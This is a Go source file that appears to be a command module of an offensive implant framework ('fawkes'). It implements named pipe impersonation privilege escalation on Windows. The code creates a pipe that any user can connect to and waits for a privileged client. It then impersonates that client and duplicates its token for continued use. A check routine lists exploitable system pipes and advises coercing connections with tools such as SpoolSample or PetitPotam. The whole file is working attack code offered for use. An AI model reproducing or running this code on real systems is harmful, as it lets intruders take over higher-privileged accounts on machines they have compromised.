//go:build windows
// +build windows

package commands

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// PipeServerCommand creates a named pipe server and impersonates connecting clients.
// Classic Windows privilege escalation: create pipe → wait for privileged connection → impersonate token.
type PipeServerCommand struct{}

func (c *PipeServerCommand) Name() string { return "pipe-server" }
func (c *PipeServerCommand) Description() string {
	return "Named pipe impersonation for privilege escalation"
}

type pipeServerArgs struct {
	Action  string `json:"action"`
	Name    string `json:"name"`
	Timeout int    `json:"timeout"`
}

// Windows API procedures for named pipe operations
var (
	procCreateNamedPipeW           = kernel32NP.NewProc("CreateNamedPipeW")
	procConnectNamedPipe           = kernel32NP.NewProc("ConnectNamedPipe")
	procDisconnectNamedPipe        = kernel32NP.NewProc("DisconnectNamedPipe")
	procImpersonateNamedPipeClient = advapi32.NewProc("ImpersonateNamedPipeClient")
)

// Named pipe constants
const (
	PIPE_ACCESS_DUPLEX       = 0x00000003
	PIPE_TYPE_MESSAGE        = 0x00000004
	PIPE_READMODE_MESSAGE    = 0x00000002
	PIPE_WAIT                = 0x00000000
	PIPE_UNLIMITED_INSTANCES = 255
	PIPE_BUFFER_SIZE         = 1024
	// FILE_FLAG_OVERLAPPED is defined in poolpartyinjection.go
)

func (c *PipeServerCommand) Execute(task structs.Task) structs.CommandResult {
	var args pipeServerArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return errorf("Failed to parse parameters: %v", err)
		}
	}

	if args.Action == "" {
		args.Action = "impersonate"
	}
	if args.Timeout == 0 {
		args.Timeout = 30
	}

	switch args.Action {
	case "impersonate":
		return pipeServerImpersonate(task, args)
	case "check":
		return pipeServerCheck(task)
	default:
		return errorf("Unknown action: %s. Use: impersonate, check", args.Action)
	}
}

// pipeServerCheck enumerates opportunities for pipe-based privesc
func pipeServerCheck(task structs.Task) structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("=== NAMED PIPE PRIVESC CHECK ===\n\n")

	// Check current privileges
	identity, err := GetCurrentIdentity()
	if err != nil {
		identity = "unknown"
	}
	sb.WriteString(fmt.Sprintf("Current identity: %s\n", identity))

	// Check SeImpersonatePrivilege
	hasImpersonate := checkPrivilege("SeImpersonatePrivilege")
	hasAssignPrimary := checkPrivilege("SeAssignPrimaryTokenPrivilege")

	sb.WriteString(fmt.Sprintf("SeImpersonatePrivilege: %s\n", boolToStatus(hasImpersonate)))
	sb.WriteString(fmt.Sprintf("SeAssignPrimaryTokenPrivilege: %s\n", boolToStatus(hasAssignPrimary)))

	if !hasImpersonate && !hasAssignPrimary {
		sb.WriteString("\n[!] Neither SeImpersonatePrivilege nor SeAssignPrimaryTokenPrivilege available.\n")
		sb.WriteString("    Pipe impersonation will only work at SecurityIdentification level.\n")
		sb.WriteString("    Consider using a service account (IIS, MSSQL, etc.) that has these privileges.\n")
	} else {
		sb.WriteString("\n[+] Pipe impersonation should work — required privileges present.\n")
	}

	// List existing pipes that might indicate exploitable services
	sb.WriteString("\n--- Interesting Pipes ---\n")
	interestingPipes := []string{
		"spoolss", "efsrpc", "lsarpc", "samr", "netlogon",
		"srvsvc", "wkssvc", "atsvc", "browser",
	}

	pipes, pipeErr := enumerateNamedPipes()
	if pipeErr == nil {
		found := 0
		for _, pipe := range pipes {
			pipeLower := strings.ToLower(pipe)
			for _, interesting := range interestingPipes {
				if strings.Contains(pipeLower, interesting) {
					sb.WriteString(fmt.Sprintf("  \\\\.\\pipe\\%s\n", pipe))
					found++
					break
				}
			}
		}
		if found == 0 {
			sb.WriteString("  (none found)\n")
		}
		sb.WriteString(fmt.Sprintf("\nTotal pipes on system: %d\n", len(pipes)))
	}

	sb.WriteString("\n--- Usage ---\n")
	sb.WriteString("pipe-server -action impersonate -name mypipe -timeout 30\n")
	sb.WriteString("Then trigger a connection from a privileged service (e.g., SpoolSample, PetitPotam).\n")

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// pipeServerImpersonate creates a named pipe, waits for connection, and impersonates
func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.CommandResult {
	if args.Name == "" {
		var rb [4]byte
		_, _ = rand.Read(rb[:])
		args.Name = hex.EncodeToString(rb[:])
	}

	pipePath := fmt.Sprintf(`\\.\pipe\%s`, args.Name)

	// Create security descriptor allowing Everyone to connect.
	// Must use NewSecurityDescriptor() which calls InitializeSecurityDescriptor
	// to set revision=1; a zero-value SECURITY_DESCRIPTOR has revision=0 and
	// SetDACL will fail with ERROR_INVALID_SECURITY_DESCR.
	sd, sdErr := windows.NewSecurityDescriptor()
	if sdErr != nil {
		return errorf("Failed to initialize security descriptor: %v", sdErr)
	}
	if err := sd.SetDACL(nil, true, false); err != nil {
		return errorf("Failed to set DACL on security descriptor: %v", err)
	}

	sa := windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		SecurityDescriptor: sd,
		InheritHandle:      0,
	}

	// Create the named pipe with FILE_FLAG_OVERLAPPED for async I/O.
	// A synchronous ConnectNamedPipe blocks the OS thread via SyscallN without
	// notifying Go's scheduler, which can prevent timers from firing.
	pipeNamePtr, err := windows.UTF16PtrFromString(pipePath)
	if err != nil {
		return errorf("Failed to convert pipe name: %v", err)
	}

	hPipe, _, createErr := procCreateNamedPipeW.Call(
		uintptr(unsafe.Pointer(pipeNamePtr)),
		PIPE_ACCESS_DUPLEX|FILE_FLAG_OVERLAPPED,
		PIPE_TYPE_MESSAGE|PIPE_READMODE_MESSAGE|PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		PIPE_BUFFER_SIZE,
		PIPE_BUFFER_SIZE,
		0,
		uintptr(unsafe.Pointer(&sa)),
	)

	if hPipe == uintptr(windows.InvalidHandle) {
		return errorf("CreateNamedPipe failed: %v", createErr)
	}
	pipeHandle := windows.Handle(hPipe)
	defer windows.CloseHandle(pipeHandle)

	// Create an event for overlapped ConnectNamedPipe
	event, eventErr := windows.CreateEvent(nil, 1, 0, nil) // manual-reset, initially non-signaled
	if eventErr != nil {
		return errorf("CreateEvent failed: %v", eventErr)
	}
	defer windows.CloseHandle(event)

	// Start async ConnectNamedPipe with OVERLAPPED
	var overlapped windows.Overlapped
	overlapped.HEvent = event

	ret, _, connectErr := procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&overlapped)))
	if ret == 0 {
		// ConnectNamedPipe returned FALSE — check error code
		if connectErr != windows.ERROR_IO_PENDING && connectErr != windows.ERROR_PIPE_CONNECTED {
			return errorf("ConnectNamedPipe failed: %v", connectErr)
		}
		// ERROR_IO_PENDING = async operation in progress, wait on event
		// ERROR_PIPE_CONNECTED = client already connected before call
	}

	connected := connectErr == windows.ERROR_PIPE_CONNECTED
	if !connected {
		// Wait for connection with timeout using WaitForSingleObject
		timeoutMs := uint32(args.Timeout * 1000)
		waitResult, waitErr := windows.WaitForSingleObject(event, timeoutMs)
		switch waitResult {
		case windows.WAIT_OBJECT_0: // 0x00000000
			connected = true
		case 258: // WAIT_TIMEOUT (windows.WAIT_TIMEOUT is syscall.Errno, not uint32)
			// Cancel the pending I/O and clean up
			windows.CancelIoEx(pipeHandle, &overlapped)
			return successf("Timeout after %ds — no client connected to %s", args.Timeout, pipePath)
		default:
			windows.CancelIoEx(pipeHandle, &overlapped)
			return errorf("WaitForSingleObject failed: result=%d err=%v", waitResult, waitErr)
		}
	}

	if !connected {
		return errorResult("Unexpected state: not connected after wait")
	}

	// Check for task cancellation
	if task.DidStop() {
		procDisconnectNamedPipe.Call(hPipe)
		return successResult("Pipe server cancelled")
	}

	// Lock goroutine to OS thread for the entire impersonation sequence.
	// ImpersonateNamedPipeClient sets the token on the current OS thread,
	// and Go's scheduler can migrate goroutines between threads at any point.
	// Without LockOSThread, OpenThreadToken may run on a different thread
	// and fail with ERROR_NO_TOKEN (1008).
	runtime.LockOSThread()

	// Client connected — impersonate
	ret, _, impErr := procImpersonateNamedPipeClient.Call(hPipe)
	if ret == 0 {
		runtime.UnlockOSThread()
		procDisconnectNamedPipe.Call(hPipe)
		return errorf("ImpersonateNamedPipeClient failed: %v\nThis usually means SeImpersonatePrivilege is not available.", impErr)
	}

	// Get the impersonated identity
	clientIdentity, identErr := GetCurrentIdentity()
	if identErr != nil {
		clientIdentity = "unknown (token obtained but identity lookup failed)"
	}

	// Get the impersonation token from the current thread
	var threadToken windows.Token
	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, true, &threadToken)
	if err != nil {
		// Try with fewer rights
		err = windows.OpenThreadToken(windows.CurrentThread(), STEAL_TOKEN_ACCESS|TOKEN_QUERY, true, &threadToken)
	}

	if err != nil {
		// Revert since we can't capture the token
		procRevertToSelf.Call()
		runtime.UnlockOSThread()
		procDisconnectNamedPipe.Call(hPipe)
		return errorf("Client connected as %s but failed to capture thread token: %v", clientIdentity, err)
	}

	// Duplicate the token for persistent use
	var dupToken windows.Token
	err = windows.DuplicateTokenEx(
		threadToken,
		windows.MAXIMUM_ALLOWED,
		nil,
		windows.SecurityDelegation,
		windows.TokenPrimary,
		&dupToken,
	)
	if err != nil {
		// Fallback to impersonation-level token
		err = windows.DuplicateTokenEx(
			threadToken,
			windows.MAXIMUM_ALLOWED,
			nil,
			windows.SecurityImpersonation,
			windows.TokenImpersonation,
			&dupToken,
		)
	}
	threadToken.Close()

	if err != nil {
		procRevertToSelf.Call()
		runtime.UnlockOSThread()
		procDisconnectNamedPipe.Call(hPipe)
		return errorf("Client connected as %s but DuplicateTokenEx failed: %v", clientIdentity, err)
	}

	// Revert the named pipe impersonation, then apply via our token system
	procRevertToSelf.Call()
	procDisconnectNamedPipe.Call(hPipe)

	// Store the token in the global identity system (calls ImpersonateLoggedOnUser on this thread)
	if setErr := SetIdentityToken(dupToken); setErr != nil {
		runtime.UnlockOSThread()
		windows.CloseHandle(windows.Handle(dupToken))
		return errorf("Client connected as %s but SetIdentityToken failed: %v", clientIdentity, setErr)
	}

	// Mark as thread-locked so PrepareExecution doesn't double-lock
	osThreadLocked = true

	var sb strings.Builder
	sb.WriteString("=== PIPE IMPERSONATION SUCCESS ===\n\n")
	sb.WriteString(fmt.Sprintf("Pipe: %s\n", pipePath))
	sb.WriteString(fmt.Sprintf("Client identity: %s\n", clientIdentity))
	sb.WriteString(fmt.Sprintf("Token stored — now impersonating %s\n", clientIdentity))
	sb.WriteString("\nUse 'rev2self' to revert to original identity.\n")
	sb.WriteString("Use 'whoami' to verify current context.\n")

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// checkPrivilege checks if the current process has a specific privilege
func checkPrivilege(privName string) bool {
	processHandle, err := windows.GetCurrentProcess()
	if err != nil {
		return false
	}

	var token windows.Token
	err = windows.OpenProcessToken(processHandle, windows.TOKEN_QUERY, &token)
	if err != nil {
		return false
	}
	defer token.Close()

	// Look up the privilege LUID
	var luid windows.LUID
	privNamePtr, err := windows.UTF16PtrFromString(privName)
	if err != nil {
		return false
	}
	err = windows.LookupPrivilegeValue(nil, privNamePtr, &luid)
	if err != nil {
		return false
	}

	// Get token privileges
	var returnLength uint32
	// First call to get required buffer size
	_ = windows.GetTokenInformation(token, windows.TokenPrivileges, nil, 0, &returnLength)
	if returnLength == 0 {
		return false
	}

	buf := make([]byte, returnLength)
	err = windows.GetTokenInformation(token, windows.TokenPrivileges, &buf[0], returnLength, &returnLength)
	if err != nil {
		return false
	}

	// Parse TOKEN_PRIVILEGES structure
	privCount := *(*uint32)(unsafe.Pointer(&buf[0]))
	type luidAndAttributes struct {
		Luid       windows.LUID
		Attributes uint32
	}

	privs := unsafe.Slice((*luidAndAttributes)(unsafe.Pointer(&buf[4])), privCount)
	for _, p := range privs {
		if p.Luid.LowPart == luid.LowPart && p.Luid.HighPart == luid.HighPart {
			return true // Privilege exists (may or may not be enabled)
		}
	}

	return false
}

func boolToStatus(b bool) string {
	if b {
		return "YES"
	}
	return "NO"
}
